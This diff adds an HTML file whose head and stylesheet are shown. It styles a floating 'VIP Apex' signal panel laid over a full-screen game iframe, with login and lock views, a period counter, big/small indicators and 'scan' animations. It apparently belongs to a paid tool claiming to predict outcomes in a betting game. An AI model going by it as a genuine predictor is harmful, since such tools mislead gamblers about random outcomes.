@@ -1,0 +1,1790 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>{name} Signal — VIP Apex</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;700;800;900&family=Share+Tech+Mono&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  background: transparent !important;
+  width: 100vw; height: 100vh;
+  overflow: hidden;
+  font-family: 'Inter', sans-serif;
+  color: #fff;
+  -webkit-tap-highlight-color: transparent;
+  user-select: none;
+  pointer-events: none;
+}
+
+/* ── Game iframe (fills screen behind everything) ── */
+#target-game-frame {
+  position: fixed; inset: 0;
+  width: 100%; height: 100%;
+  border: none;
+  z-index: -1;
+  pointer-events: auto;
+  background: #000;
+}
+
+/* ── Shared animations ── */
+@keyframes fab-float { 0%,100%{transform:translateY(0) rotate(-2deg);} 50%{transform:translateY(-4px) rotate(2deg);} }
+@keyframes rotate-cw { to { transform: rotate(360deg); } }
+@keyframes rotate-ccw { to { transform: rotate(-360deg); } }
+@keyframes dot-pulse { 0%,100%{transform:scale(.85);opacity:.7;} 50%{transform:scale(1.15);opacity:1;} }
+@keyframes spdFadeIn { 0%{opacity:0;transform:scale(.92);} 100%{opacity:1;transform:scale(1);} }
+@keyframes spdFadeOut { 0%{opacity:1;transform:scale(1);} 100%{opacity:0;transform:scale(.9);} }
+@keyframes borderFlowCw { 0%{stroke-dashoffset:0;} 100%{stroke-dashoffset:-1000;} }
+@keyframes borderFlowCcw { 0%{stroke-dashoffset:0;} 100%{stroke-dashoffset:1000;} }
+@keyframes ring-spin { to { transform: rotate(360deg); } }
+@keyframes ring-spin-rev { to { transform: rotate(-360deg); } }
+@keyframes scanFloat { 0%,100%{transform:translateY(0);opacity:.6;} 50%{transform:translateY(-3px);opacity:1;} }
+@keyframes flowBtnGrad { 0%{background-position:100% 50%;} 100%{background-position:0% 50%;} }
+@keyframes glareSweep { 0%{left:-150%;} 20%{left:150%;} 100%{left:150%;} }
+@keyframes coinPulse { 0%,100%{box-shadow:0 0 14px rgba(255,200,50,.9),0 0 30px rgba(255,150,0,.5),inset 0 -3px 8px rgba(120,50,0,.7),inset 0 2px 6px rgba(255,255,220,.9);} 50%{box-shadow:0 0 22px rgba(255,220,70,1),0 0 42px rgba(255,160,0,.7),inset 0 -3px 8px rgba(120,50,0,.7),inset 0 2px 6px rgba(255,255,220,.95);} }
+
+/* ── Mini FAB ── */
+#mini {
+  display: flex;
+  position: absolute; left: 20px; top: 100px;
+  width: 50px; height: 50px;
+  cursor: pointer; touch-action: none;
+  z-index: 2147483647; user-select: none;
+  pointer-events: auto; will-change: left, top;
+  animation: fab-float 3.4s ease-in-out infinite;
+}
+#mini:active { cursor: grabbing; }
+#fab-core {
+  width: 46px; height: 46px; border-radius: 50%; position: relative;
+  display: flex; align-items: center; justify-content: center;
+  background: radial-gradient(circle at 35% 25%, rgba(255,255,255,.25), transparent 20%), radial-gradient(circle, #180A24, #08050D 75%);
+  border: 2px solid #C026FF;
+  box-shadow: 0 0 14px rgba(192,38,255,.75), inset 0 0 10px rgba(192,38,255,.4);
+  overflow: hidden; animation: fab-float 3s ease-in-out infinite;
+}
+#fab-core:before {
+  content: ''; position: absolute; inset: -6px; border-radius: 50%;
+  background: conic-gradient(transparent, #7900FF, transparent, #F05BFF, transparent);
+  animation: rotate-cw 2.8s linear infinite;
+}
+#fab-core:after { content: ''; position: absolute; inset: 4px; border-radius: 50%; background: #08050D; z-index: 1; }
+#fab-icon { position: relative; z-index: 3; width: 34px; height: 34px; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+#fab-icon img { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; filter: drop-shadow(0 0 4px #C026FF); }
+#fab-dot { position: absolute; right: 0; top: 0; width: 9px; height: 9px; border-radius: 50%; background: #F05BFF; box-shadow: 0 0 10px #C026FF; z-index: 5; animation: dot-pulse 1.1s infinite; }
+
+/* ── Stage (panel) ── */
+#stage {
+  display: none; position: absolute;
+  left: calc(50% - 90px); top: calc(50% - 110px);
+  width: 180px; height: 220px; min-height: 220px; max-height: 220px;
+  z-index: 2147483647; touch-action: none; cursor: grab;
+  user-select: none; -webkit-user-select: none; border-radius: 14px;
+  box-shadow: 0 8px 30px rgba(0,0,0,.9), 0 0 8px rgba(192,38,255,.25);
+  pointer-events: auto; will-change: left, top;
+}
+#stage:active { cursor: grabbing; }
+#stage.spd-open { display: block; animation: spdFadeIn .25s ease-out forwards; }
+#stage.spd-close { animation: spdFadeOut .2s ease-in forwards; pointer-events: none; }
+
+.border-svg { position: absolute; inset: 0; width: 100%; height: 100%; pointer-events: none; z-index: 25; border-radius: 14px; }
+.stream-base,.stream-1,.stream-2,.stream-3 { fill: none; stroke-linecap: round; }
+.stream-base { stroke: rgba(192,38,255,.2); stroke-width: 1.2px; }
+.stream-1 { stroke: #C026FF; stroke-width: 1.5px; stroke-dasharray: 140 860; filter: drop-shadow(0 0 3px #C026FF); animation: borderFlowCw 3.2s linear infinite; }
+.stream-2 { stroke: #F05BFF; stroke-width: 1.5px; stroke-dasharray: 110 890; filter: drop-shadow(0 0 3px #F05BFF); animation: borderFlowCcw 2.5s linear infinite; }
+.stream-3 { stroke: #7900FF; stroke-width: 1.4px; stroke-dasharray: 90 910; filter: drop-shadow(0 0 3px #7900FF); animation: borderFlowCw 4.2s linear infinite; }
+
+.stage-wrapper {
+  position: absolute; inset: 0; border-radius: 14px;
+  background: radial-gradient(circle at 50% 25%, #180A24 0%, #0d0614 50%, #08050D 100%);
+  border: 1.2px solid rgba(192,38,255,.75);
+  box-shadow: inset 0 0 12px rgba(192,38,255,.2), 0 0 5px rgba(192,38,255,.2);
+  padding: 6px 7px 7px;
+  display: flex; flex-direction: column;
+  overflow: hidden; z-index: 1;
+  animation: borderAuraPulse 4s ease-in-out infinite alternate;
+}
+@keyframes borderAuraPulse {
+  0% { border-color: rgba(192,38,255,.75); box-shadow: inset 0 0 12px rgba(192,38,255,.2), 0 0 4px rgba(192,38,255,.15); }
+  50% { border-color: rgba(240,91,255,.85); box-shadow: inset 0 0 14px rgba(240,91,255,.25), 0 0 5px rgba(240,91,255,.2); }
+  100% { border-color: rgba(121,0,255,.75); box-shadow: inset 0 0 12px rgba(121,0,255,.2), 0 0 4px rgba(121,0,255,.15); }
+}
+
+.panel-grid {
+  position: absolute; inset: 0;
+  background-image: linear-gradient(rgba(192,38,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(192,38,255,.05) 1px, transparent 1px);
+  background-size: 10px 10px; pointer-events: none; z-index: 2;
+}
+.hex-tex {
+  position: absolute; right: 5px; top: 4px; width: 45px; height: 45px; opacity: .2;
+  pointer-events: none; z-index: 2;
+  background-image: radial-gradient(circle, #C026FF 1px, transparent 1px);
+  background-size: 6px 6px;
+  -webkit-mask-image: radial-gradient(circle at top right, #000 30%, transparent 75%);
+  mask-image: radial-gradient(circle at top right, #000 30%, transparent 75%);
+}
+.rain-canvas {
+  position: absolute; inset: 0; width: 100%; height: 100%;
+  pointer-events: none; z-index: 3; border-radius: 14px;
+  opacity: 0.92; mix-blend-mode: screen;
+}
+
+/* ── Shared header ── */
+.stage-header {
+  position: relative; z-index: 5;
+  display: flex; justify-content: center; align-items: center;
+  padding: 4px 8px;
+  border: 1.2px solid #C026FF; border-radius: 6px;
+  background: linear-gradient(135deg, rgba(121,0,255,0.45) 0%, rgba(24,10,36,0.95) 50%, rgba(192,38,255,0.35) 100%);
+  box-shadow: 0 0 12px rgba(192,38,255,0.35), inset 0 0 8px rgba(192,38,255,0.2);
+  clip-path: polygon(0 0, calc(100% - 8px) 0, 100% 8px, 100% 100%, 8px 100%, 0 calc(100% - 8px));
+  flex: 0 0 auto;
+}
+.title-group { display: flex; flex-direction: column; align-items: center; justify-content: center; line-height: 1.1; }
+.sub-title {
+  font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 10.5px;
+  letter-spacing: 1.5px; color: #fff;
+  text-shadow: 0 0 10px #C026FF, 0 0 20px #F05BFF;
+  text-transform: uppercase;
+}
+
+/* ── Panel views (auth / locked / main) ── */
+.panel-view {
+  display: none; flex: 1;
+  flex-direction: column; justify-content: space-between;
+  position: relative; z-index: 5;
+  min-height: 0;
+}
+.panel-view.active { display: flex; }
+
+#view-auth, #view-locked {
+  justify-content: space-between;
+  align-items: center;
+  text-align: center;
+  padding: 2px 0;
+}
+.view-body {
+  flex: 1; display: flex; flex-direction: column;
+  justify-content: center; align-items: center;
+  gap: 4px; width: 100%;
+}
+.lock-icon-wrap {
+  width: 44px; height: 44px; border-radius: 50%;
+  display: grid; place-items: center;
+  background: radial-gradient(circle, rgba(192,38,255,0.28), rgba(8,5,13,0.9));
+  border: 1.5px solid #C026FF;
+  box-shadow: 0 0 14px rgba(192,38,255,0.5), inset 0 0 8px rgba(192,38,255,0.3);
+  color: #F05BFF; margin-bottom: 4px;
+  animation: lockPulse 2s ease-in-out infinite;
+}
+@keyframes lockPulse {
+  0%,100% { box-shadow: 0 0 12px rgba(192,38,255,0.4), inset 0 0 6px rgba(192,38,255,0.2); }
+  50% { box-shadow: 0 0 22px rgba(240,91,255,0.8), inset 0 0 12px rgba(240,91,255,0.4); }
+}
+.view-title {
+  font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 11px;
+  letter-spacing: 1px; color: #fff;
+  text-shadow: 0 0 10px #C026FF, 0 0 20px #F05BFF;
+}
+.view-sub {
+  font-family: 'Inter', sans-serif; font-weight: 700; font-size: 8px;
+  letter-spacing: 0.8px; color: #F05BFF;
+  text-shadow: 0 0 8px rgba(240,91,255,0.7);
+}
+
+/* ── Buttons ── */
+.btn-single {
+  flex: 1; height: 28px;
+  border: 1.5px solid #C026FF; border-radius: 7px;
+  font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 9px;
+  letter-spacing: 1.2px; color: #fff;
+  text-shadow: 0 0 8px rgba(192,38,255,0.9);
+  background: linear-gradient(90deg, #180A24 0%, #7900FF 30%, #C026FF 50%, #7900FF 70%, #180A24 100%);
+  background-size: 250% 100%;
+  animation: flowBtnGrad 4s linear infinite;
+  box-shadow: 0 0 14px rgba(192,38,255,0.5), inset 0 1px 2px rgba(255,255,255,0.3);
+  clip-path: polygon(6px 0, calc(100% - 6px) 0, 100% 50%, calc(100% - 6px) 100%, 6px 100%, 0 50%);
+  cursor: pointer; transition: transform 0.15s ease;
+}
+.btn-single:active { transform: scale(0.95); }
+
+/* NEW: chhota HIDE (✕) button — sabhi views me */
+.btn-hide-sm {
+  flex: 0 0 34px; height: 28px;
+  border: 1.5px solid #F05BFF; border-radius: 7px;
+  background: linear-gradient(180deg, rgba(240,91,255,0.55) 0%, rgba(121,0,255,0.85) 50%, rgba(8,5,13,0.98) 100%);
+  color: #fff; font-family: 'Orbitron', sans-serif; font-weight: 900;
+  font-size: 13px; cursor: pointer; padding: 0;
+  display: flex; align-items: center; justify-content: center;
+  box-shadow: 0 0 10px rgba(240,91,255,0.55), inset 0 0 6px rgba(240,91,255,0.35);
+  text-shadow: 0 0 8px rgba(240,91,255,0.9);
+  clip-path: polygon(5px 0, calc(100% - 5px) 0, 100% 50%, calc(100% - 5px) 100%, 5px 100%, 0 50%);
+  transition: transform 0.15s ease;
+}
+.btn-hide-sm:active { transform: scale(0.88); }
+
+/* ── Main view (design01 content) ── */
+.mid-row { position: relative; z-index: 5; display: flex; gap: 5px; height: 86px; flex: 0 0 auto; }
+
+.coin-side {
+  position: relative; flex: 0 0 70px; height: 100%;
+  display: flex; align-items: center; justify-content: center;
+  border: 1.5px solid #C026FF; border-radius: 9px;
+  background: radial-gradient(circle at 50% 50%, rgba(121,0,255,.35), rgba(8,5,13,.9));
+  overflow: hidden;
+  box-shadow: 0 0 8px rgba(192,38,255,0.35), inset 0 0 10px rgba(121,0,255,0.2);
+}
+.ring { position: absolute; border-radius: 50%; }
+.ring-dots { width: 68px; height: 68px; animation: ring-spin 14s linear infinite; }
+.ring-dots:before { content: ''; position: absolute; inset: 0; border-radius: 50%; border: 1.5px dotted rgba(240,91,255,.7); }
+.ring-ticks { width: 56px; height: 56px; animation: ring-spin-rev 10s linear infinite; }
+.ring-ticks:before { content: ''; position: absolute; inset: 0; border-radius: 50%; border: 1.5px dashed rgba(192,38,255,.55); }
+
+.orbital-ring {
+  position: absolute; top: calc(50% - 34px); left: calc(50% - 34px);
+  width: 68px; height: 68px; border-radius: 50%;
+  pointer-events: none; z-index: 6;
+  transform-origin: center center;
+  animation: orbitalSpinNormal 7s linear infinite;
+}
+@keyframes orbitalSpinNormal { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+
+.cross-dot {
+  position: absolute; width: 7px; height: 7px; border-radius: 50%;
+  background: radial-gradient(circle at 35% 25%, #fff 0%, #f5c2ff 35%, #F05BFF 65%, #C026FF 90%, #7900FF 100%);
+  box-shadow: 0 0 8px #C026FF, 0 0 14px rgba(192,38,255,.75), inset 0 1px 1px #fff;
+  border: 0.8px solid #fff; z-index: 7;
+  transition: all 0.2s ease;
+}
+.cross-dot.top { top: -3.5px; left: calc(50% - 3.5px); }
+.cross-dot.bottom { bottom: -3.5px; left: calc(50% - 3.5px); }
+.cross-dot.left { left: -3.5px; top: calc(50% - 3.5px); }
+.cross-dot.right { right: -3.5px; top: calc(50% - 3.5px); }
+
+.coin {
+  position: relative; width: 44px; height: 44px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  animation: coinPulse 2.8s ease-in-out infinite;
+  z-index: 5; cursor: pointer; transition: transform .2s ease;
+}
+.coin-img {
+  width: 100%; height: 100%; object-fit: contain; border-radius: 50%;
+  pointer-events: none; display: none;
+  filter: drop-shadow(0 0 8px rgba(192,38,255,0.65));
+  transition: filter 0.2s ease;
+}
+.coin:active { transform: scale(0.94); }
+.coin-side.khatarnak-scan .coin-img {
+  filter: drop-shadow(0 0 10px #C026FF) drop-shadow(0 0 18px rgba(240,91,255,0.7)) brightness(1.1);
+}
+.coin-num {
+  position: absolute; left: 50%; top: 50%; transform: translate(-50%,-50%);
+  font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 20px;
+  color: #F05BFF;
+  text-shadow: 0 0 10px rgba(192,38,255,0.8), 0 0 18px rgba(240,91,255,0.6);
+  z-index: 6; display: none; pointer-events: none;
+}
+.coin-placeholder {
+  width: 100%; height: 100%; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 8.5px;
+  letter-spacing: 1.2px; text-transform: uppercase; color: #fff;
+  text-shadow: 0 0 6px #00f0ff, 0 0 14px rgba(0,240,255,0.85), 0 0 20px #C026FF;
+  background: radial-gradient(circle at 35% 30%, rgba(0,240,255,0.25) 0%, rgba(121,0,255,0.6) 60%, #08050D 100%);
+  border: 1.5px solid #00f0ff;
+  box-shadow: 0 0 12px rgba(0,240,255,0.45), inset 0 0 10px rgba(192,38,255,0.35);
+  animation: placeholderPulse 2s ease-in-out infinite alternate;
+}
+@keyframes placeholderPulse {
+  0% { transform: scale(0.96); box-shadow: 0 0 8px rgba(0,240,255,0.35), inset 0 0 6px rgba(192,38,255,0.25); }
+  100% { transform: scale(1.04); box-shadow: 0 0 16px rgba(0,240,255,0.7), inset 0 0 14px rgba(0,240,255,0.45); }
+}
+
+.status-side {
+  flex: 1; display: flex; flex-direction: column; justify-content: space-between;
+  gap: 3px; border: 1.5px solid #C026FF; border-radius: 9px;
+  padding: 4px 6px;
+  background: linear-gradient(180deg, rgba(24,10,36,0.95) 0%, rgba(8,5,13,0.98) 100%);
+  box-shadow: 0 0 8px rgba(192,38,255,0.35), inset 0 0 10px rgba(121,0,255,0.2);
+  backdrop-filter: blur(8px);
+}
+.signal-row {
+  display: flex; align-items: center; gap: 4px;
+  font-family: 'Inter', sans-serif; font-weight: 700; font-size: 7px;
+  letter-spacing: 0.3px; color: #fff; white-space: nowrap;
+}
+.sig-led {
+  width: 7px; height: 7px; flex-shrink: 0; border-radius: 2px;
+  background: linear-gradient(135deg, #F05BFF, #C026FF);
+  box-shadow: 0 0 6px #C026FF;
+  animation: scanFloat 2s ease-in-out infinite;
+}
+.size-btn {
+  position: relative; cursor: default;
+  border: 1.2px solid #C026FF; border-radius: 5px;
+  background: linear-gradient(180deg, rgba(192,38,255,0.45) 0%, rgba(121,0,255,0.75) 50%, rgba(8,5,13,0.95) 100%);
+  font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 11px;
+  letter-spacing: 1.5px; color: #fff; padding: 4px 6px;
+  display: flex; align-items: center; justify-content: center;
+  box-shadow: 0 0 12px rgba(192,38,255,0.45), inset 0 0 8px rgba(192,38,255,0.3);
+  text-shadow: 0 0 8px rgba(240,91,255,0.95);
+  clip-path: polygon(5px 0, calc(100% - 5px) 0, 100% 50%, calc(100% - 5px) 100%, 5px 100%, 0 50%);
+  transition: all .25s ease;
+}
+.size-btn.is-small {
+  border-color: #C026FF;
+  background: linear-gradient(180deg, rgba(192,38,255,0.45) 0%, rgba(121,0,255,0.75) 50%, rgba(8,5,13,0.95) 100%);
+  box-shadow: 0 0 12px rgba(192,38,255,0.45), inset 0 0 8px rgba(192,38,255,0.3);
+}
+.size-btn.is-big {
+  border-color: #F05BFF;
+  background: linear-gradient(180deg, rgba(240,91,255,0.45) 0%, rgba(192,38,255,0.75) 50%, rgba(24,10,36,0.95) 100%);
+  box-shadow: 0 0 12px rgba(240,91,255,0.5), inset 0 0 8px rgba(240,91,255,0.35);
+}
+.sync-row { display: flex; align-items: center; gap: 4px; }
+.sync-label { font-family: 'Orbitron', sans-serif; font-size: 5.5px; font-weight: 700; letter-spacing: 0.6px; color: rgba(255,255,255,0.9); }
+.sync-track {
+  position: relative; flex: 1; height: 6px; border-radius: 99px;
+  border: 1px solid rgba(192,38,255,.4); background: #08050D;
+  padding: 1px; box-sizing: border-box; display: flex; align-items: center;
+}
+.sync-fill {
+  display: block; height: 100%; width: 0%; border-radius: 99px;
+  background: linear-gradient(90deg, #7900FF, #C026FF, #F05BFF);
+  box-shadow: 0 0 6px #C026FF;
+  transition: width 0.32s cubic-bezier(0.22, 1, 0.36, 1);
+}
+.sync-dot {
+  position: absolute; top: 50%; width: 3px; height: 3px; border-radius: 50%;
+  background: rgba(192,38,255,0.35); border: 0.5px solid rgba(192,38,255,0.6);
+  transform: translate(-50%, -50%); pointer-events: none; z-index: 3;
+  transition: all 0.25s ease;
+}
+.sync-dot.dot-25 { left: 25%; }
+.sync-dot.dot-50 { left: 50%; }
+.sync-dot.dot-75 { left: 75%; }
+.sync-dot.dot-100 { left: calc(100% - 2.5px); }
+.sync-dot.active {
+  background: #fff; border-color: #F05BFF;
+  box-shadow: 0 0 5px #C026FF, 0 0 9px #F05BFF;
+  transform: translate(-50%,-50%) scale(1.3);
+}
+.sync-pct { font-family: 'Orbitron', sans-serif; font-size: 6.5px; font-weight: 900; color: #fff; min-width: 22px; text-align: right; }
+.mode-row { display: flex; justify-content: space-between; font-family: 'Inter', sans-serif; font-weight: 700; font-size: 6.5px; letter-spacing: 0.5px; color: #fff; }
+.mode-row b { color: #F05BFF; font-weight: 800; text-shadow: 0 0 5px rgba(192,38,255,.7); }
+
+.period-bar {
+  position: relative; z-index: 5;
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 3px 6px;
+  border: 1px solid #C026FF; border-radius: 6px;
+  background: linear-gradient(90deg, rgba(121,0,255,.35), rgba(8,5,13,.95));
+  font-family: 'Inter', sans-serif; font-weight: 700; font-size: 8px;
+  letter-spacing: 1px; color: #fff;
+  box-shadow: 0 0 10px rgba(192,38,255,.3);
+  clip-path: polygon(6px 0, calc(100% - 6px) 0, 100% 50%, calc(100% - 6px) 100%, 6px 100%, 0 50%);
+  white-space: nowrap; flex: 0 0 auto;
+}
+.ping-badge {
+  font-family: 'Orbitron', sans-serif; font-size: 7.5px; font-weight: 800; color: #fff;
+  letter-spacing: 0.5px; border: none; background: transparent; padding: 0 2px;
+  white-space: nowrap; display: inline-flex; align-items: center; gap: 3px;
+}
+.ping-badge span { color: #F05BFF; font-weight: 900; text-shadow: 0 0 6px #C026FF; }
+.period-text {
+  display: inline-flex; align-items: center; gap: 3px;
+  font-family: 'Inter', sans-serif; font-weight: 700; font-size: 8px;
+  letter-spacing: 1px; color: #fff; margin-right: 4px;
+}
+#periodNum {
+  font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 9.5px;
+  color: #F05BFF; text-shadow: 0 0 8px rgba(240,91,255,.95); letter-spacing: 1.2px;
+}
+
+.stage-btnrow {
+  position: relative; z-index: 5;
+  display: flex; gap: 6px; height: 28px; flex: 0 0 auto;
+}
+button#spd-start {
+  flex: 1.15; height: 100%; position: relative; cursor: pointer;
+  border: 1.5px solid #C026FF; border-radius: 7px;
+  font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 8.5px;
+  letter-spacing: 1.2px; color: #fff;
+  text-shadow: 0 0 8px rgba(192,38,255,.9);
+  overflow: hidden;
+  background: linear-gradient(90deg, #180A24 0%, #7900FF 30%, #C026FF 50%, #7900FF 70%, #180A24 100%);
+  background-size: 250% 100%;
+  animation: flowBtnGrad 4s linear infinite;
+  box-shadow: 0 0 14px rgba(192,38,255,.5), inset 0 1px 2px rgba(255,255,255,.3);
+  clip-path: polygon(6px 0, calc(100% - 6px) 0, 100% 50%, calc(100% - 6px) 100%, 6px 100%, 0 50%);
+  transition: transform .15s ease;
+}
+button#spd-start::after {
+  content: ''; position: absolute; top: 0; left: -150%;
+  width: 40%; height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,.55), transparent);
+  transform: skewX(-20deg); animation: glareSweep 5.5s ease infinite; pointer-events: none;
+}
+button#spd-start:active { transform: scale(.95); }
+button#spd-start:disabled { filter: grayscale(.8) opacity(.6); cursor: not-allowed; animation: none; }
+
+button#spd-hide {
+  flex: .85; height: 100%; position: relative; cursor: pointer;
+  border: 1.5px solid #F05BFF; border-radius: 7px;
+  font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 9px;
+  letter-spacing: 1.5px; color: #fff;
+  text-shadow: 0 0 8px rgba(240,91,255,.9);
+  background: linear-gradient(90deg, #2a0033 0%, #7900FF 30%, #F05BFF 50%, #7900FF 70%, #2a0033 100%);
+  background-size: 250% 100%;
+  animation: flowBtnGrad 4s linear infinite;
+  box-shadow: 0 0 14px rgba(240,91,255,.5), inset 0 1px 2px rgba(255,255,255,.3);
+  clip-path: polygon(6px 0, calc(100% - 6px) 0, 100% 50%, calc(100% - 6px) 100%, 6px 100%, 0 50%);
+  transition: transform .15s ease;
+}
+button#spd-hide:active { transform: scale(.95); }
+
+/* Chassis overdrive (during scan) */
+.stage-wrapper.chassis-overdrive {
+  border-color: rgba(192,38,255,0.85) !important;
+  box-shadow: inset 0 0 15px rgba(192,38,255,.35), 0 0 8px rgba(240,91,255,.3) !important;
+  animation: chassisOverdriveShake .22s ease-in-out infinite alternate;
+}
+@keyframes chassisOverdriveShake {
+  0%{transform:translate(0,0);} 25%{transform:translate(-.6px,.5px);}
+  50%{transform:translate(.5px,-.6px);} 75%{transform:translate(-.4px,-.4px);}
+  100%{transform:translate(.6px,.5px);}
+}
+.stage-overdrive .stream-1 { animation: borderFlowCw 1.8s linear infinite !important; stroke-width: 1.8px !important; filter: drop-shadow(0 0 4px #C026FF) !important; }
+.stage-overdrive .stream-2 { animation: borderFlowCcw 1.5s linear infinite !important; stroke-width: 1.8px !important; filter: drop-shadow(0 0 4px #F05BFF) !important; }
+.stage-overdrive .stream-3 { animation: borderFlowCw 2.0s linear infinite !important; stroke-width: 1.6px !important; filter: drop-shadow(0 0 4px #7900FF) !important; }
+
+.coin-side.khatarnak-scan {
+  border-color: #C026FF !important;
+  box-shadow: inset 0 0 14px rgba(192,38,255,.4), 0 0 12px rgba(240,91,255,.35) !important;
+}
+.coin-side.khatarnak-scan .orbital-ring { animation: classicOrbitalSpin 1.6s cubic-bezier(0.25,0.9,0.45,1) infinite !important; }
+@keyframes classicOrbitalSpin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+.coin-side.khatarnak-scan .cross-dot {
+  width: 8px; height: 8px;
+  background: radial-gradient(circle at 35% 25%, #fff 0%, #f5c2ff 35%, #F05BFF 70%, #7900FF 100%);
+  box-shadow: 0 0 8px #C026FF, 0 0 14px rgba(192,38,255,0.85), inset 0 1px 1px #fff;
+  animation: classicPearlGlow .65s ease-in-out infinite alternate;
+}
+@keyframes classicPearlGlow {
+  0% { transform: scale(0.92); box-shadow: 0 0 8px #C026FF; }
+  100% { transform: scale(1.25); box-shadow: 0 0 14px #C026FF, 0 0 20px rgba(240,91,255,0.85); }
+}
+.coin-side.khatarnak-scan .ring-dots { animation: ring-spin 2.4s linear infinite !important; }
+.coin-side.khatarnak-scan .ring-ticks { animation: ring-spin-rev 1.8s linear infinite !important; }
+.coin-side.khatarnak-scan .coin { animation: classicTumblerFloat .65s ease-in-out infinite alternate !important; }
+@keyframes classicTumblerFloat {
+  0% { transform: scale(0.96) translateY(1.5px) rotate(-3deg); filter: drop-shadow(0 0 8px rgba(192,38,255,0.55)) brightness(1.05); }
+  100% { transform: scale(1.06) translateY(-2px) rotate(3deg); filter: drop-shadow(0 0 14px rgba(240,91,255,0.75)) brightness(1.15); }
+}
+
+/* Supernova flash + EMP + sparks */
+.supernova-flash {
+  position: absolute; inset: 0;
+  background: radial-gradient(circle at 50% 50%, #fff 15%, #F05BFF 45%, rgba(121,0,255,0.75) 75%, transparent 100%);
+  opacity: 0; pointer-events: none; z-index: 10;
+}
+.supernova-flash.active { animation: supernovaFlashAnim 0.48s cubic-bezier(0.1,0.9,0.2,1) forwards; }
+@keyframes supernovaFlashAnim {
+  0% { opacity: 1; transform: scale(0.4); }
+  35% { opacity: 0.95; transform: scale(1.6); }
+  100% { opacity: 0; transform: scale(2.6); }
+}
+.emp-shockwave {
+  position: absolute; width: 44px; height: 44px; border-radius: 50%;
+  border: 2px solid #fff;
+  box-shadow: 0 0 25px #C026FF, 0 0 45px #7900FF, inset 0 0 15px #C026FF;
+  pointer-events: none; z-index: 7; opacity: 0;
+}
+.emp-shockwave.blast { animation: empBlastAnim .9s cubic-bezier(0.05,0.9,0.15,1) forwards; }
+@keyframes empBlastAnim {
+  0% { transform: scale(0.45); opacity: 1; border-color: #fff; }
+  30% { border-color: #F05BFF; box-shadow: 0 0 35px #C026FF, 0 0 65px #7900FF; }
+  100% { transform: scale(3.8); opacity: 0; }
+}
+.emp-shockwave.secondary { border-color: #F05BFF; box-shadow: 0 0 25px #C026FF, 0 0 50px #7900FF; }
+.emp-shockwave.secondary.blast { animation: empBlastAnimSec .85s cubic-bezier(0.1,0.85,0.25,1) .06s forwards; }
+@keyframes empBlastAnimSec {
+  0% { transform: scale(0.35); opacity: 1; border-color: #F05BFF; }
+  35% { border-color: #C026FF; box-shadow: 0 0 35px #F05BFF, 0 0 70px #7900FF; }
+  100% { transform: scale(4.4); opacity: 0; }
+}
+@keyframes coinQuantumSlam {
+  0% { transform: scale(0.65) rotate(-22deg); filter: brightness(1.2) drop-shadow(0 0 16px #C026FF); }
+  35% { transform: scale(1.42) rotate(14deg); filter: brightness(1.3) drop-shadow(0 0 24px #F05BFF); }
+  60% { transform: scale(0.88) rotate(-6deg); }
+  80% { transform: scale(1.08) rotate(2deg); }
+  100% { transform: scale(1) rotate(0deg); filter: brightness(1) drop-shadow(0 0 8px rgba(192,38,255,0.6)); }
+}
+.coin-quantum-slam { animation: coinQuantumSlam .9s cubic-bezier(0.175,0.885,0.32,1.275) forwards !important; }
+.spark-container { position: absolute; inset: 0; pointer-events: none; z-index: 8; }
+.spark-particle {
+  position: absolute; left: 50%; top: 50%;
+  width: 5px; height: 5px; border-radius: 50%;
+  box-shadow: 0 0 12px currentColor, 0 0 24px currentColor;
+  pointer-events: none;
+  animation: sparkFly .85s cubic-bezier(0.1,0.9,0.2,1) forwards;
+}
+@keyframes sparkFly {
+  0% { transform: translate(-50%,-50%) scale(2.6); opacity: 1; }
+  100% { transform: translate(var(--tx),var(--ty)) scale(0); opacity: 0; }
+}
+@keyframes sizePunch {
+  0% { transform: scale(0.75); opacity: 0.4; }
+  50% { transform: scale(1.25); opacity: 1; box-shadow: 0 0 28px rgba(176,38,255,1); }
+  100% { transform: scale(1); opacity: 1; }
+}
+.size-punch { animation: sizePunch 0.45s ease-out forwards; }
+@keyframes periodFlash {
+  0% { color: #fff; text-shadow: 0 0 22px #00f0ff, 0 0 35px #00f0ff; }
+  100% { color: #00f0ff; text-shadow: 0 0 8px rgba(0,240,255,.95); }
+}
+.period-flash { animation: periodFlash 0.6s ease-out forwards; }
+
+/* ── Full-screen block warning overlay ── */
+#warnOverlay {
+  position: fixed; inset: 0; z-index: 2147483648;
+  background: rgba(8,5,13,0.96);
+  display: none; align-items: center; justify-content: center;
+  padding: 24px;
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  pointer-events: auto;
+}
+#warnOverlay.show { display: flex; }
+.warn-card {
+  width: 88%; max-width: 290px;
+  padding: 20px 18px 18px; border-radius: 14px;
+  background: radial-gradient(circle at 50% 25%, #180A24 0%, #0d0614 50%, #08050D 100%);
+  border: 1.5px solid #C026FF;
+  box-shadow: 0 0 30px rgba(192,38,255,0.6), inset 0 0 20px rgba(192,38,255,0.15), 0 20px 40px rgba(0,0,0,0.95);
+  text-align: center;
+  animation: warnPop 0.4s cubic-bezier(0.2,0.9,0.3,1.2);
+}
